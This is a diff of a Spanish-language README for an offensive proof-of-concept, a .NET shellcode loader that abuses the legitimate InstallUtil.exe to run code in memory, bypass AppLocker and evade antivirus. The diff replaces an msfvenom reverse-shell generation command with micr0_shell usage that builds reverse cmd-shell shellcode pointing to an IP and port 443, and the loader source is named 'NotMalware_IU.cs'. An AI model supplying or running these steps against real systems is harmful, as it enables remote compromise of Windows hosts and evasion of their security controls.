@@ -1,9 +1,4 @@
 
----
-
-### ✅ `bypass`
-
-
 # 🚀 InstallUtil Shellcode Loader (.NET LOLBAS)
 
 Este proyecto es una prueba de concepto que demuestra cómo abusar del binario legítimo `InstallUtil.exe` para ejecutar código arbitrario en memoria (shellcode), incluso en entornos restringidos con AppLocker habilitado. Utiliza técnicas **LOLBAS (Living Off the Land Binaries and Scripts)** para evadir controles de seguridad.
@@ -82,11 +77,13 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 
 ## 🧨 Generar shellcode
 
-Puedes usar `msfvenom` para generar shellcode crudo en formato C# (byte array):
+Puedes usar `micr0_shell` para generar shellcode crudo en formato C# (byte array):
+git clone https://github.com/senzee1984/micr0_shell
 
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PUERTO> -f csharp EXITFUNC=thread
-```
+pip install keystone-engine
+
+USO:
+python3 'micr0 shell.py' --ip 192.168.1.45 --port 443 --type cmd --language c --variable shellcode --execution false --save True --output buf.bin
 
 Pega el contenido directamente dentro del `byte[] shellcode` en el archivo `.cs`.
 
@@ -108,7 +105,6 @@ Para evitar detección por AV:
 ```
 .
 ├── NotMalware_IU.cs         # Código fuente del loader
-├── NotMalware_IU.dll        # Binario compilado (InstallUtil)
 └── README.md                # Este archivo
 ```
 
